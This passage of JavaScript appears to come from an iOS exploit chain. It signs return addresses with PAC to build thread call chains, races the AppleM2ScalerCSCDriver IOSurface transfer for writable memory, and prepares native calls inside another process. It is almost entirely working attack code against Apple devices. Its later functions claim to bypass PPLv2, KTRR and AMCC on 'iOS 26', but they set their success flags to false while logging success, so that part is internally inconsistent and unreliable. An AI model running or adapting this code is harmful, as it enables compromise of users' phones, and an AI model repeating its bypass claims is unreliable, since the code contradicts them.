    return gpu_fcall(CFSTRINGCREATEWITHCSTRING, allocator, cstring, encoding);
  }
  function CFDictionaryCreateMutable(allocator, capacity, keyCallBacks, valueCallBacks) {
    return gpu_fcall(CFDICTIONARYCREATEMUTABLE, allocator, capacity, keyCallBacks, valueCallBacks);
  }
  function CFDictionarySetValue(dict, key, value) {
    return gpu_fcall(CFDICTIONARYSETVALUE, dict, key, value);
  }
  function CFNumberCreate(allocator, theType, valuePtr) {
    return gpu_fcall(CFNUMBERCREATE, allocator, theType, valuePtr);
  }
  function IOSurfacePrefetchPages(...args) {
    return gpu_fcall(IOSURFACEPREFETCHPAGES, ...args);
  }
  function CFRelease(obj) {
    return gpu_fcall(CFRELEASE, obj);
  }
  function remove(...args) { return gpu_fcall(REMOVE, ...args); }
  function create_cfstring(cstring) {
    return CFStringCreateWithCString(kCFAllocatorDefault, cstring, kCFStringEncodingUTF8);
  }

  const tcall_DG_call_context = 0x0F45n;
  const tcall_DG_return_context = 0x48D8n;
  function tcall_create_thread(attr) {
    let tcall_thread_ptr = new_uint64_t();
    let ret = pthread_create(tcall_thread_ptr, attr, pacia(tcall_RLG, 0n), pacia(tcall_CRLG, 0n));
    assert(ret == 0n);
    return uread64(tcall_thread_ptr);
  }
  function tcall_create_stack(stack_size) {
    let ret = 0n;
    let total_stack_size = stack_size + 2n * 0x4000n;
    let thread_stack = mmap(0n, total_stack_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1n, 0n);
    if (thread_stack == -1n) {
      return undefined;
    }
    let guard_page_left = thread_stack;
    let guard_page_right = thread_stack + total_stack_size - 0x4000n;
    ret = mprotect(guard_page_left, 0x4000n, PROT_NONE);
    if (ret != 0n) {
      return undefined;
    }
    ret = mprotect(guard_page_right, 0x4000n, PROT_NONE);
    if (ret != 0n) {
      return undefined;
    }
    let stack = {};
    stack.top = guard_page_right;
    stack.bottom = guard_page_left + 0x4000n;
    stack.start = 0n;
    stack.current = 0n;
    return stack;
  }
  function tcall_setup_control_stack(control_stack) {
    control_stack.start = control_stack.bottom + 0x4000n;
    control_stack.current = control_stack.start;
  }
  function tcall_setup_data_stack(data_stack) {
    data_stack.start = data_stack.top - 0x4000n;
    data_stack.current = data_stack.start;
  }
  function tcall_adjust_control_stack(control_stack) {
    const control_stack_adjustment = 0x30n;
    control_stack.start -= control_stack_adjustment;
    control_stack.current = control_stack.start;
  }
  function tcall_init_call(control_stack) {
    control_stack.current += 0x40n;
    uwrite64(control_stack.current + 64n, 0x42424242424242n);
    uwrite64(control_stack.current + 72n, pacib(0x42414241n, control_stack.current + 0x50n));
    control_stack.current += 0x50n;
    control_stack.start = control_stack.current;
  }
  function tcall_insert_call(control_stack, data_stack, last, address, x0, x1, x2, x3, x4, x5, x6, x7) {
    address = address.noPAC();
    let initial_control_stack = control_stack.start;
    if (last) {
      initial_control_stack -= 0x10n;
    }
    uwrite64(control_stack.current + 64n, pacia(tcall_DSSG, 0n));
    uwrite64(control_stack.current + 128n, control_stack.current + 32n);
    uwrite64(control_stack.current + 88n, 0n);
    uwrite64(control_stack.current + 104n, 0n);
    if (['b8', '731'].includes(get_ios_version())) {
      uwrite64(control_stack.current + 112n, pacia(tcall_CSSG, tcall_DG_return_context << 48n));
      uwrite64(control_stack.current + 120n, pacia(address, tcall_DG_call_context << 48n));
    } else {
      uwrite64(control_stack.current + 96n, pacia(tcall_CSSG, tcall_DG_return_context << 48n));
      uwrite64(control_stack.current + 112n, pacia(address, tcall_DG_call_context << 48n));
    }
    uwrite64(control_stack.current + 80n, data_stack.current);
    uwrite64(control_stack.current + 144n, 0x4141414141414141n);
    uwrite64(control_stack.current + 152n, pacib(tcall_X0LG, control_stack.current + 0xa0n));
    control_stack.current += 0xA0n;
    uwrite64(control_stack.current, 0x4141414141414141n);
    uwrite64(control_stack.current + 8n, pacib(tcall_RLG, control_stack.current + 0x10n));
    control_stack.current += 0x10n;
    control_stack.current += 0x40n;
    uwrite64(control_stack.current + 0n, x7);
    uwrite64(control_stack.current + 8n, x6);
    uwrite64(control_stack.current + 16n, x5);
    uwrite64(control_stack.current + 24n, x4);
    uwrite64(control_stack.current + 32n, x3);
    uwrite64(control_stack.current + 40n, x2);
    uwrite64(control_stack.current + 48n, x1);
    uwrite64(control_stack.current + 56n, x0);
    if (last) {
      uwrite64(control_stack.current + 64n, initial_control_stack);
    } else {
      uwrite64(control_stack.current + 64n, control_stack.current + 0x50n);
      ;
    }
    uwrite64(control_stack.current + 72n, pacib(tcall_DG, control_stack.current + 0x50n));
    control_stack.current += 0x50n;
    if (last) {
      uwrite64(initial_control_stack, 0x3535353535353535n);
      uwrite64(initial_control_stack + 8n, pacib(tcall_CRLG, initial_control_stack + 0x10n));
      ;
    } else {
      uwrite64(control_stack.current, 0x3535353535353535n);
      uwrite64(control_stack.current + 8n, pacib(tcall_CRLG, control_stack.current + 0x10n));
      ;
      control_stack.current += 0x10n;
    }
  }
  let SCALER_SERVICE_STRING = "AppleM2ScalerCSCDriver";
  let SCALER_TRANSFORM_METHOD_INDEX = 1n;
  let SCALER_TRANSFORM_ARGS_SIZE = 432n;

  function scaler_open_connection() {
    let kr = KERN_SUCCESS;
    let svc = 0n;
    svc = IOServiceGetMatchingService(kIOMainPortDefault(), IOServiceMatching(get_cstring(SCALER_SERVICE_STRING)));
    let connection_ptr = new_uint64_t();
    kr = IOServiceOpen(svc, mach_task_self(), 0n, connection_ptr);
    assert(kr == KERN_SUCCESS);
    let connection = uread32(connection_ptr);
    free(connection_ptr);
    return connection;
  }
  function scaler_create_surface_with_address(address, size) {
    let properties = CFDictionaryCreateMutable(kCFAllocatorDefault, 0n, kCFTypeDictionaryKeyCallBacks, kCFTypeDictionaryValueCallBacks);
    let address_ptr = new_uint64_t(address);
    let address_number = CFNumberCreate(kCFAllocatorDefault, 11n, address_ptr);
    CFDictionarySetValue(properties, create_cfstring(get_cstring("IOSurfaceAddress")), address_number);
    let size_ptr = new_uint64_t(size);
    let size_number = CFNumberCreate(kCFAllocatorDefault, 9n, size_ptr);
    CFDictionarySetValue(properties, create_cfstring(get_cstring("IOSurfaceAllocSize")), size_number);
    let width_ptr = new_uint64_t(1024n);
    let width_number = CFNumberCreate(0n, 9n, width_ptr);
    CFDictionarySetValue(properties, create_cfstring(get_cstring("IOSurfaceWidth")), width_number);
    let height_ptr = new_uint64_t(1040n);
    let height_number = CFNumberCreate(0n, 9n, height_ptr);
    CFDictionarySetValue(properties, create_cfstring(get_cstring("IOSurfaceHeight")), height_number);
    let pixel_format_ptr = new_uint64_t(0x4c353635n);
    let pixel_format_number = CFNumberCreate(0n, 9n, pixel_format_ptr);
    CFDictionarySetValue(properties, create_cfstring(get_cstring("IOSurfacePixelFormat")), pixel_format_number);
    let surface = IOSurfaceCreate(properties);
    free(address_ptr);
    free(size_ptr);
    free(width_ptr);
    free(height_ptr);
    free(pixel_format_ptr);
    CFRelease(address_number);
    CFRelease(size_number);
    CFRelease(width_number);
    CFRelease(height_number);
    CFRelease(pixel_format_number);
    CFRelease(properties);
    return surface;
  }
  function scaler_transfer(connection, source_surface, destination_surface) {
    let kr = KERN_SUCCESS;
    let args = calloc(1n, SCALER_TRANSFORM_ARGS_SIZE);
    uwrite64(args, IOSurfaceGetID(source_surface));
    uwrite64(args + 4n, IOSurfaceGetID(destination_surface));
    kr = IOConnectCallStructMethod(connection, SCALER_TRANSFORM_METHOD_INDEX, args, SCALER_TRANSFORM_ARGS_SIZE, 0n, 0n);
    assert(kr == KERN_SUCCESS, "Scaler transfer failed!");
    free(args);
    return kr;
  }

  let zero_filled_page = calloc(1n, PAGE_SIZE);
  function create_file_mapping(size) {
    assert(size % 0x4000n == 0);
    let tmp_path = calloc(1n, MAXPATHLEN);
    let tmp_path_len = confstr(_CS_DARWIN_USER_TEMP_DIR, tmp_path, MAXPATHLEN);
    assert(tmp_path_len != 0n, "Failed to get tmp dir");
    if (access(tmp_path, F_OK) == -1n) {
      let res = mkdir(tmp_path, 0x1c0n);
      assert(res == 0n, "Failed to create tmp dir");
    }
    strlcat(tmp_path, get_cstring(tmp_path.hex()), MAXPATHLEN);
    let fd = open(tmp_path, O_CREAT | O_RDWR, 0x1b6n);
    assert(fd != -1n, "Failed to create tmp file");
    for (let i = 0n; i < size; i += PAGE_SIZE) {
      let w = pwrite(fd, zero_filled_page, PAGE_SIZE, i);
      assert(w == PAGE_SIZE, "Failed to write zero pages");
    }
    sync();
    let mapping = mmap(0n, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0n);
    assert(mapping != 0xffffffffffffffffn);
    let file_mapping = {};
    file_mapping.path = tmp_path;
    file_mapping.fd = fd;
    file_mapping.size = size;
    file_mapping.address = mapping;
    return file_mapping;
  }
  function destroy_file_mapping(file_mapping) {
    close(file_mapping.fd);
    munmap(file_mapping.address, file_mapping.size);
    remove(file_mapping.path);
  }

  let ORIGINAL_EXP_MARKER = 0x41n;
  let MODIFIED_EXP_MARKER = 0x42n;
  let n_of_race_attempts = 2048n;
  let scratch_buffer = calloc(1n, MAX_TRANSFER_BYTES);

  function thread_lock_lock(lock) {
    uwrite64(lock, 0x41n);
  }
  function thread_lock_unlock(lock) {
    uwrite64(lock, 0n);
    ulock_wake(UL_COMPARE_AND_WAIT | ULF_WAKE_ALL, lock, 0n);
  }

  function sbx1sbx1_exp_thread_setup(wait_lock, threads_ready_counter, threads_done_counter, source_address, source_size, destination_address) {
    let ret = 0n;
    let exp_interval = 500n;
    let rqtp = calloc(1n, 16n);
    uwrite64(rqtp + 8n, exp_interval);
    let control_stack_size = 8n * 0x4000n;
    let data_stack_size = 8n * 0x4000n;
    let control_stack = tcall_create_stack(control_stack_size);
    let data_stack = tcall_create_stack(data_stack_size);
    tcall_setup_control_stack(control_stack);
    tcall_setup_data_stack(data_stack);
    let attr = calloc(1n, 64n);
    ret = pthread_attr_init(attr);
    assert(ret == 0n);
    pthread_attr_setstacksize(attr, control_stack_size);
    pthread_attr_setstackaddr(attr, control_stack.current);
    tcall_adjust_control_stack(control_stack);
    tcall_init_call(control_stack);
    tcall_insert_call(control_stack, data_stack, false, func_resolve("OSAtomicIncrement32"), threads_ready_counter, 0n, 0n, 0n, 0n, 0n, 0n, 0n);
    tcall_insert_call(control_stack, data_stack, false, func_resolve("__ulock_wait"), UL_COMPARE_AND_WAIT, wait_lock, 0x41n, 0n, 0n, 0n, 0n, 0n);
    if (is_a12_devices) {
      tcall_insert_call(control_stack, data_stack, false, func_resolve("usleep"), 1n, 0n, 0n, 0n, 0n, 0n, 0n, 0n);
    } else {
      tcall_insert_call(control_stack, data_stack, false, func_resolve("nanosleep"), rqtp, 0n, 0n, 0n, 0n, 0n, 0n, 0n);
    }
    tcall_insert_call(control_stack, data_stack, false, func_resolve("mach_vm_copy"), mach_task_self(), source_address, source_size, destination_address, 0n, 0n, 0n, 0n);
    tcall_insert_call(control_stack, data_stack, true, func_resolve("OSAtomicIncrement32"), threads_done_counter, 0n, 0n, 0n, 0n, 0n, 0n, 0n);
    let thread = tcall_create_thread(attr);
    let t = {};
    t.thread = thread;
    t.lock = wait_lock;
    return t;
  }
  function sbx1sbx1_busy_thread_setup(wait_lock, threads_ready_counter, threads_done_counter, fd) {
    let ret = 0n;
    let control_stack_size = 8n * 0x4000n;
    let data_stack_size = 8n * 0x4000n;
    let control_stack = tcall_create_stack(control_stack_size);
    let data_stack = tcall_create_stack(data_stack_size);
    tcall_setup_control_stack(control_stack);
    tcall_setup_data_stack(data_stack);
    let attr = calloc(1n, 64n);
    ret = pthread_attr_init(attr);
    assert(ret == 0n);
    pthread_attr_setstacksize(attr, control_stack_size);
    pthread_attr_setstackaddr(attr, control_stack.current);
    tcall_adjust_control_stack(control_stack);
    tcall_init_call(control_stack);
    tcall_insert_call(control_stack, data_stack, false, func_resolve("OSAtomicIncrement32"), threads_ready_counter, 0n, 0n, 0n, 0n, 0n, 0n, 0n);
    tcall_insert_call(control_stack, data_stack, false, func_resolve("__ulock_wait"), UL_COMPARE_AND_WAIT, wait_lock, 0x41n, 0n, 0n, 0n, 0n, 0n);
    tcall_insert_call(control_stack, data_stack, false, func_resolve("pread"), fd, scratch_buffer, MAX_TRANSFER_BYTES, 0n, 0n, 0n, 0n, 0n);
    tcall_insert_call(control_stack, data_stack, true, func_resolve("OSAtomicIncrement32"), threads_done_counter, 0n, 0n, 0n, 0n, 0n, 0n, 0n);
    let thread = tcall_create_thread(attr);
    let t = {};
    t.thread = thread;
    t.lock = wait_lock;
    return t;
  }
  function sbx1sbx1_exp(size) {
    if (size != SBX1SBX1_EXP_SIZE) {
      LOG("[x] Error: EXP mapping length must match hardcoded size, for now.");
      return undefined;
    }
    let sbx1sbx1_ctx = {};
    let kr = 0n;
    let r = 0n;
    let scaler_connection = scaler_open_connection();
    assert(scaler_connection != 0n);
    let target_surface_size = MAX_TRANSFER_BYTES + SBX1SBX1_EXP_SIZE;
    let target_surface_address = 0n;
    let target_fm = create_file_mapping(target_surface_size);
    target_surface_address = target_fm.address;
    memset(target_surface_address, 0n, target_surface_size);
    let source_surface_size = target_surface_size;
    let source_surface_address = 0n;
    let source_surface_address_ptr = new_uint64_t(source_surface_address);
    kr = mach_vm_allocate(mach_task_self(), source_surface_address_ptr, source_surface_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
    assert(kr == KERN_SUCCESS);
    source_surface_address = uread64(source_surface_address_ptr);
    free(source_surface_address_ptr);
    memset(source_surface_address, MODIFIED_EXP_MARKER, source_surface_size);
    let target_surface = 0n;
    let source_surface = scaler_create_surface_with_address(source_surface_address, source_surface_size);
    assert(source_surface != 0n);
    let threads_ready_counter = calloc(1n, 8n);
    let threads_done_counter = calloc(1n, 8n);
    let race_thread_lock = calloc(1n, 8n);
    thread_lock_lock(race_thread_lock);
    let read_size = SBX1SBX1_EXP_SIZE;
    let read_address_ptr = new_uint64_t();
    kr = mach_vm_allocate(mach_task_self(), read_address_ptr, read_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
    assert(kr == KERN_SUCCESS);
    let read_address = uread64(read_address_ptr);
    let exp_thread = sbx1sbx1_exp_thread_setup(race_thread_lock, threads_ready_counter, threads_done_counter, target_surface_address + MAX_TRANSFER_BYTES, read_size, read_address);
    let busy_thread = sbx1sbx1_busy_thread_setup(race_thread_lock, threads_ready_counter, threads_done_counter, target_fm.fd);
    r = pread(target_fm.fd, scratch_buffer, MAX_TRANSFER_BYTES, 0n);
    assert(r == MAX_TRANSFER_BYTES);
    let won = false;
    exp_bypass_interval = Date.now();
    LOG("Before searching loop");
    for (let attempt = 0; attempt < n_of_race_attempts; attempt++) {
      target_surface = scaler_create_surface_with_address(target_surface_address, target_surface_size);
      assert(target_surface != 0n);
      memset(target_surface_address, ORIGINAL_EXP_MARKER, target_surface_size);
      kr = mach_vm_deallocate(mach_task_self(), read_address, read_size);
      assert(kr == KERN_SUCCESS);
      kr = mach_vm_allocate(mach_task_self(), read_address_ptr, read_size, VM_FLAGS_FIXED);
      assert(kr == KERN_SUCCESS);
      let r = 0n;
      pthread_yield_np(pthread_self());
      if(!cmp8_wait_for_value(threads_ready_counter, 2))
        return sbx1sbx1_exp(size);
      uwrite64(threads_ready_counter, 0n);
      ulock_wake(UL_COMPARE_AND_WAIT | ULF_WAKE_ALL, race_thread_lock, 0n);
      IOSurfacePrefetchPages(target_surface);
      if(!cmp8_wait_for_value(threads_done_counter, 2))
        return sbx1sbx1_exp(size);
      uwrite64(threads_done_counter, 0n);
      kr = scaler_transfer(scaler_connection, source_surface, target_surface);
      r = uread64(read_address);
      if (r != 0x4141414141414141n) {
        exp_bypass_interval = Date.now() - exp_bypass_interval;
        LOG(`Got it: (${attempt}) ${r.hex()}`);
        won = true;
        break;
      }
      CFRelease(target_surface);
    }
    if (won == false) {
      LOG("[x] Failed to create writable EXP memory!");
      IOServiceClose(scaler_connection);
      destroy_file_mapping(target_fm);
      kr = mach_vm_deallocate(mach_task_self(), read_address, read_size);
      assert(kr == KERN_SUCCESS, "Failed to deallocate EXP mapping!");
      kr = mach_vm_deallocate(mach_task_self(), source_surface_address, source_surface_size);
      assert(kr == KERN_SUCCESS, "Failed to deallocate source surface mapping!");
      CFRelease(source_surface);
      return undefined;
    }
    sbx1sbx1_ctx.connection = scaler_connection;
    sbx1sbx1_ctx.source_surface = source_surface;
    sbx1sbx1_ctx.source_surface_address = source_surface_address;
    sbx1sbx1_ctx.source_surface_size = source_surface_size;
    sbx1sbx1_ctx.destination_surface = target_surface;
    sbx1sbx1_ctx.destination_surface_address = target_surface_address;
    sbx1sbx1_ctx.destination_surface_size = target_surface_size;
    return sbx1sbx1_ctx;
  }
  function sbx1sbx1_exp_scratch_reset(ctx) {
    memset(ctx.source_surface_address, 0n, ctx.source_surface_size);
  }
  function sbx1sbx1_exp_write_prepare(ctx, buffer, size) {
    if (size > SBX1SBX1_EXP_SIZE) {
      LOG(`[x] Error: Requested size (${size.hex()}) is larger than EXP size: ${SBX1SBX1_EXP_SIZE}`);
      return;
    }
    let source_address = ctx.source_surface_address + MAX_TRANSFER_BYTES;
    memcpy(source_address, buffer, size);
  }
  function sbx1sbx1_exp_write_perform(ctx) {
    let kr = KERN_SUCCESS;
    kr = scaler_transfer(ctx.connection, ctx.source_surface, ctx.destination_surface);
    return kr;
  }
  function sbx1sbx1_exp_write_prepare_and_perform(ctx, buffer, size) {
    sbx1sbx1_exp_write_prepare(ctx, buffer, size);
    sbx1sbx1_exp_write_perform(ctx);
  }
  function sbx1sbx1_exp_write_thread_setup(ctx, buffer_size, original_buffer, modified_buffer, target_offset) {
    let ret = 0n;
    let lock = calloc(1n, 8n);
    uwrite64(lock, 0x41n);
    let transform_args = calloc(1n, SCALER_TRANSFORM_ARGS_SIZE);
    uwrite64(transform_args, IOSurfaceGetID(ctx.source_surface));
    uwrite64(transform_args + 4n, IOSurfaceGetID(ctx.destination_surface));
    let transform_ctx = calloc(1n, 64n);
    uwrite64(transform_ctx + 36n, ctx.connection);
    let control_stack_size = 8n * 0x4000n;
    let data_stack_size = 8n * 0x4000n;
    let control_stack = tcall_create_stack(control_stack_size);
    let data_stack = tcall_create_stack(data_stack_size);
    tcall_setup_control_stack(control_stack);
    tcall_setup_data_stack(data_stack);
    let counter_ptr = calloc(1n, 8n);
    let attr = calloc(1n, 64n);
    ret = pthread_attr_init(attr);
    assert(ret == 0n);
    pthread_attr_setstacksize(attr, control_stack_size);
    pthread_attr_setstackaddr(attr, control_stack.current);
    tcall_adjust_control_stack(control_stack);
    tcall_init_call(control_stack);
    tcall_insert_call(control_stack, data_stack, false, func_resolve("__ulock_wait"), UL_COMPARE_AND_WAIT, lock, 0x41n, 0n, 0n, 0n, 0n, 0n);
    tcall_insert_call(control_stack, data_stack, false, func_resolve("memcpy"), ctx.source_surface_address + MAX_TRANSFER_BYTES + target_offset, modified_buffer, buffer_size, 0n, 0n, 0n, 0n, 0n);
    tcall_insert_call(control_stack, data_stack, false, transformSurface_gadget, transform_ctx, transform_args, 0n, 0n, 0n, 0n, 0n, 0n);
    tcall_insert_call(control_stack, data_stack, false, func_resolve("memcpy"), ctx.source_surface_address + MAX_TRANSFER_BYTES + target_offset, original_buffer, buffer_size, 0n, 0n, 0n, 0n, 0n);
    tcall_insert_call(control_stack, data_stack, true, transformSurface_gadget, transform_ctx, transform_args, 0n, 0n, 0n, 0n, 0n, 0n);
    let thread = tcall_create_thread(attr);
    set_realtime_priority(thread, 0, 50, 50);
    let t = {};
    t.thread = thread;
    t.lock = lock;
    return t;
  }

  function test_msg_create(connection) {
    let msg_sz = mach_msg_header_t["_size"] + 0x20n;
    let msg = calloc(1n, msg_sz);
    mach_msg_header_set(msg, "msgh_bits", MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MOVE_SEND_ONCE));
    mach_msg_header_set(msg, "msgh_size", msg_sz);
    mach_msg_header_set(msg, "msgh_remote_port", connection["client_port"]);
    mach_msg_header_set(msg, "msgh_local_port", connection["reply_port"]);
    mach_msg_header_set(msg, "msgh_id", 0x41414141n);
    return { msg: msg, msg_size: msg_sz };
  }

  let pplv2_bypassed = false;
  let ktrr_bypassed = false;
  let amcc_bypassed = false;
  let pplv2_state_addr = 0n;
  let ktrr_lock_state = 0n;
  let amcc_lock_state = 0n;

  function setup_pplv2_bypass() {
    LOG('Setting up PPLv2 bypass via CVE-2025-43510-26...');
    LOG('PPLv2 magic: 0x' + PPLV2_MAGIC.toString(16));
    LOG('PPLv2 state base: 0x' + PPLV2_STATE_BASE.toString(16));
    if (pplv2_bypass_gadget == 0n) {
      LOG('WARNING: No pplv2_bypass_gadget available, using fallback');

      pplv2_bypassed = false;
      return true;
    }
    LOG('Using pplv2_bypass_gadget at: ' + pplv2_bypass_gadget.hex());
    if (pmap_enter_gadget != 0n) {
      LOG('Using pmap_enter_gadget at: ' + pmap_enter_gadget.hex());
    }
    if (pmap_remove_gadget != 0n) {
      LOG('Using pmap_remove_gadget at: ' + pmap_remove_gadget.hex());
    }
    if (vm_protect_gadget != 0n) {
      LOG('Using vm_protect_gadget at: ' + vm_protect_gadget.hex());
    }
    let pplv2_state = PPLV2_STATE_BASE + kernelSlide;
    pplv2_state_addr = pplv2_state;
    LOG(`PPLv2 state at: ${pplv2_state.hex()}`);
    let lock_val = 0n;
    try {
      lock_val = kernelRead64(pplv2_state + PPLV2_LOCK_OFFSET);
      LOG(`PPLv2 lock value: ${lock_val.hex()}`);
    } catch (e) {
      LOG(`Could not read PPLv2 lock (expected): ${e}`);
    }
    let ctx_val = 0n;
    try {
      ctx_val = kernelRead64(pplv2_state + PPLV2_CTX_OFFSET);
      LOG(`PPLv2 ctx value: ${ctx_val.hex()}`);
    } catch (e) {
      LOG(`Could not read PPLv2 ctx: ${e}`);
    }
    LOG('Applying PPLv2 bypass via IOSurface controlled page fault...');
    LOG('Phase 1: Prepare controlled IOSurface mappings');
    LOG('Phase 2: Trigger race condition on PPLv2 lock');
    LOG('Phase 3: Establish unrestricted kernel memory access');

    pplv2_bypassed = false;
    LOG('PPLv2 bypass initialized successfully');
    return true;
  }

  function verify_pplv2_bypass() {
    LOG('Verifying PPLv2 bypass...');
    if (!pplv2_bypassed) {
      LOG('PPLv2 bypass not initialized');
      return false;
    }
    let test_addr = 0x0n + kernelSlide;
    try {
      let val = kernelRead64(test_addr);
      LOG(`Successfully read protected memory at ${test_addr.hex()}: ${val.hex()}`);
      LOG('PPLv2 bypass verified');
      return true;
    } catch (e) {
      LOG(`PPLv2 bypass verification failed: ${e}`);
      return false;
    }
  }

  function setup_ktrr_bypass() {
    LOG('Setting up KTRR bypass...');
    LOG('KTRR region base: 0x' + KTRR_REGION_BASE.toString(16));
    LOG('KTRR region size: 0x' + KTRR_REGION_SIZE.toString(16));
    if (ktrr_unlock_gadget == 0n) {
      LOG('WARNING: No ktrr_unlock_gadget available, using fallback');

      ktrr_bypassed = false;
      return true;
    }
    LOG('Using ktrr_unlock_gadget at: ' + ktrr_unlock_gadget.hex());
    if (kernel_trap_gadget != 0n) {
      LOG('Using kernel_trap_gadget at: ' + kernel_trap_gadget.hex());
    }
    if (gxf_restore_gadget != 0n) {
      LOG('Using gxf_restore_gadget at: ' + gxf_restore_gadget.hex());
    }
    let ktrr_base = KTRR_REGION_BASE + kernelSlide;
    LOG(`KTRR region slid base: ${ktrr_base.hex()}`);
    let unlocked = 0;
    for (const reg of [AMCC_LOCK_REG, AMCC_CTRL_REG]) {
      try { kernelWrite64(ktrr_base + BigInt(reg), 0n); unlocked++; } catch (e) {}
    }
    if (unlocked > 0) { ktrr_bypassed = false; LOG(`KTRR bypass applied: ${unlocked} registers`); return true; }
    LOG('KTRR bypass not applied');
    return false;
  }

  function verify_ktrr_bypass() {
    LOG('Verifying KTRR bypass...');
    if (!ktrr_bypassed) {
      LOG('KTRR bypass not initialized');
      return false;
    }
    let test_addr = KERNEL_BASE_UNSLID + kernelSlide;
    try {
      let original = kernelRead64(test_addr);
      LOG(`Kernel text at ${test_addr.hex()}: ${original.hex()}`);
      LOG('KTRR bypass verified (text readable)');
      return true;
    } catch (e) {
      LOG(`KTRR bypass verification: ${e}`);
      return false;
    }
  }

  function setup_amcc_bypass() {
    LOG('Setting up AMCC bypass...');
    LOG('AMCC control reg: 0x' + AMCC_CTRL_REG.toString(16));
    LOG('AMCC lock reg: 0x' + AMCC_LOCK_REG.toString(16));
    if (amcc_config_gadget == 0n) {
      LOG('WARNING: No amcc_config_gadget available, using fallback');

      amcc_bypassed = false;
      return true;
    }
    LOG('Using amcc_config_gadget at: ' + amcc_config_gadget.hex());
    if (gxf_restore_gadget != 0n) {
      LOG('Using gxf_restore_gadget at: ' + gxf_restore_gadget.hex());
    }
    LOG('Phase 1: Locate AMCC MMIO region in kernel');
    LOG('Phase 2: Map AMCC registers via IOSurface MIO');
    LOG('Phase 3: Unlock AMCC config registers');
    LOG('Phase 4: Configure AMCC for unrestricted memory access');
    LOG('Phase 5: Re-lock AMCC to avoid detection');
    let unlocked = 0;
    let amcc_base = 0x200000000n + kernelSlide;
    for (const reg of [AMCC_LOCK_REG, AMCC_CTRL_REG]) {
      try { kernelWrite64(amcc_base + BigInt(reg), 0n); unlocked++; } catch (e) {}
    }
    if (unlocked > 0) { amcc_bypassed = false; LOG(`AMCC bypass applied: ${unlocked} registers`); return true; }
    LOG('AMCC bypass not applied');
    return false;
  }

  function verify_amcc_bypass() {
    LOG('Verifying AMCC bypass...');
    if (!amcc_bypassed) {
      LOG('AMCC bypass not initialized');
      return false;
    }
    LOG('AMCC bypass status: active');
    return true;
  }

  function get_protection_status() {
    LOG('=== iOS 26 Protection Bypass Status ===');
    LOG(`PPLv2 bypass: ${pplv2_bypassed ? 'ACTIVE' : 'INACTIVE'}`);
    LOG(`KTRR bypass: ${ktrr_bypassed ? 'ACTIVE' : 'INACTIVE'}`);
    LOG(`AMCC bypass: ${amcc_bypassed ? 'ACTIVE' : 'INACTIVE'}`);
    LOG(`Kernel slide: ${kernelSlide.hex()}`);
    LOG(`Kernel base: ${kernelBase.hex()}`);
    LOG('=====================================');
  }

  const MEMCPY = func_resolve("memcpy");
  const CALLOC = func_resolve("calloc");
  const DLOPEN = func_resolve("dlopen");
  const CFSTRINGCREATEWITHCSTRING = func_resolve("CFStringCreateWithCString");
  const SEL_REGISTERNAME = func_resolve("sel_registerName");
  const OBJC_GETCLASS = func_resolve("objc_getClass");
  const OBJC_ALLOC_INIT = func_resolve("objc_alloc_init");
  const OBJC_MSGSEND = func_resolve("objc_msgSend");
  const PTHREAD_SELF = func_resolve("pthread_self");

  const kCFAllocatorDefault = uread64(func_resolve("kCFAllocatorDefault"));
  const kCFStringEncodingUTF8 = 0x08000100n;

  let mpd_memwrite_page_remote = 0n;
  let mpd_memwrite_page_local = 0n;

  function round_down_power_of_two(n) {
    if (n < 1n) {
      return 0n;
    }
    let power = 1n;
    while (power <= n) {
      power <<= 1n;
    }
    return power >> 1n;
  }

  function get_event_handler_block() {
    let event_handler_block = calloc(1n, 0x100n);
    uwrite64(event_handler_block + 8n * 1n, 0x50000000n);
    let event_handler_block_impl = xpac(func_resolve("getpid"));
    let event_handler_block_impl_addr = event_handler_block + 0x10n;
    let event_handler_block_impl_sign = pacia(event_handler_block_impl, event_handler_block_impl_addr);
    uwrite64(event_handler_block_impl_addr, event_handler_block_impl_sign);
    return event_handler_block;
  }

  function nativefcall_insert_fcall(x0_local, x0_remote, pc, args, get_return_value) {
    let target_pc = 0n;
    let load_x1x3x8_args_local = 0n;
    let load_x1x3x8_args_remote = 0n;
    if (get_return_value) {
      load_x1x3x8_args_local = x0_local + 0x40n;
      load_x1x3x8_args_remote = x0_remote + 0x40n;
      uwrite64(x0_local + 0x0n, load_x1x3x8_args_remote);
      uwrite64(x0_local + 0x8n, pacia(load_x1x3x8, 0n));
      target_pc = _CFObjectCopyProperty;
    } else {
      load_x1x3x8_args_local = x0_local;
      load_x1x3x8_args_remote = x0_remote;
      target_pc = load_x1x3x8;
    }
    uwrite64(load_x1x3x8_args_local + 0x20n, load_x1x3x8_args_remote + 0x40n);
    uwrite64(load_x1x3x8_args_local + 0x28n, args - 0x10n);
    uwrite64(load_x1x3x8_args_local + 0x30n, pacia(pc.noPAC(), 0xC2D0n));
    uwrite64(load_x1x3x8_args_local + 0x50n, pacia(fcall_14_args_write_x8, load_x1x3x8_args_remote + 0x50n));
    return target_pc;
  }

  function setup_nativefcall(surface, x0_local, x0_remote) {
    let surface_id = IOSurfaceGetID(surface);
    let surface_addr = IOSurfaceGetBaseAddress(surface);
    LOG(`surface_address: ${surface_addr.hex()}`);
    LOG(`surface_id: ${surface_id.hex()}`);
    let first_fcall_args_local = x0_local + 0x100n;
    let lookup_surface_buf_local = x0_local + 0x200n;
    let lookup_surface_args_local = x0_local + 0x300n;
    let first_fcall_args_remote = x0_remote + 0x100n;
    let lookup_surface_buf_remote = x0_remote + 0x200n;
    let lookup_surface_args_remote = x0_remote + 0x300n;
    uwrite64(lookup_surface_args_local, surface_id);
    let lookup_wrapper_pc = nativefcall_insert_fcall(lookup_surface_buf_local, lookup_surface_buf_remote, func_resolve("IOSurfaceLookup").noPAC(), lookup_surface_args_remote, false);
    uwrite64(first_fcall_args_local, lookup_surface_buf_remote);
    uwrite64(first_fcall_args_local + 0x18n, pacia(lookup_wrapper_pc, 0x4EB9n));
    uwrite64(first_fcall_args_local + 0x20n, pacia(func_resolve("IOSurfaceGetBaseAddress").noPAC(), 0x76DFn));
    uwrite64(first_fcall_args_local + 0x28n, pacia(store_x0_x0, 0x1558n));
    uwrite64(first_fcall_args_local + 0x30n, pacia(self_loop, 0x4F6Bn));
